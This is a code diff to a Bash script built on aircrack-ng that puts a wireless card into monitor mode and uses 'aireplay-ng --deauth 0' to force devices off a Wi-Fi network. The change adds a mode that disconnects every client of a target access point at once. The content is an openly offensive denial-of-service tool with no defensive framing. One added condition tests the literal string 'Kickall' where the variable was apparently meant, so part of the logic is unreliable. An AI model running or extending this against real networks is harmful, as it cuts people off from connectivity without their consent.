@@ -12,7 +12,7 @@ fi
 # Get arguments 
 # reset True > disable monitor mode befor exit
 # r and l without : coz thir is no input 
-while getopts "b:e:hrl:c:" option;
+while getopts "b:e:harl:c:" option ; 
 do
     case $option in
         e) # set wiff essid
@@ -25,7 +25,7 @@ do
             echo -e "-e for wifi essid\n-b for wifi bssid\n-r disable monitor mode\n-l list wifi\n-c target mac address"
             ;;
         l)
-            nmcli device wifi list ifname $OPTARG 
+            nmcli device wifi list ifname $OPTARG || echo -e "\n-l interface name " ; iw dev| grep "Interface"
             exit
             ;;
         c)
@@ -35,9 +35,9 @@ do
             Kickall=True
             ;;
         \?) # unexpected arguments 
-            echo -e "\n-e for wifi essid\n-b for wifi bssid "
+            echo -e "\nunexpected argument run -h for help "
             exit;;
-    esac
+    esac 
 done
 
 # ================================= Functions ================================= #
@@ -116,7 +116,12 @@ function GetMacList() {
 
 # Kick user by mac address
 function kickUser(){
-    sudo aireplay-ng --deauth 0 -a $1 -c $2 $3
+    if [ $Kickall ]
+    then
+        sudo aireplay-ng --deauth 0 -a $1 $2
+    else
+        sudo aireplay-ng --deauth 0 -a $1 -c $2 $3
+    fi
     resetMode
 }
 
@@ -131,7 +136,7 @@ dpkg -s ${packgeNeeded[@]} > /dev/null 2>&1 || installAllPackages
 interface=$(startMonitorMode)
 
 # if the bessid is given 
-if [ ! -z $wifiBssid ] && [ -z $targetMac ]
+if [ ! -z $wifiBssid ] && [ -z $targetMac ] && [ -z Kickall ]
 then
     # Start GetMacList function with essid option
     GetMacList "-d $wifiBssid"
@@ -147,9 +152,9 @@ elif [ ! -z $wifiBssid ] && [ ! -z $targetMac ]
 then
     kickUser $wifiBssid $targetMac $interface
     exit
-elif [ ! -z $wifiBssid ] && [ ! -z $Kickall ]
+elif [ ! -z $wifiBssid ] && [ ! -z $Kickall ] 
 then
-    kickUser $wifiBssid $targetMac $interface $Kickall
+    kickUser $wifiBssid $interface $Kickall
     exit
 else
     echo "You Must Give Essid or bssid "
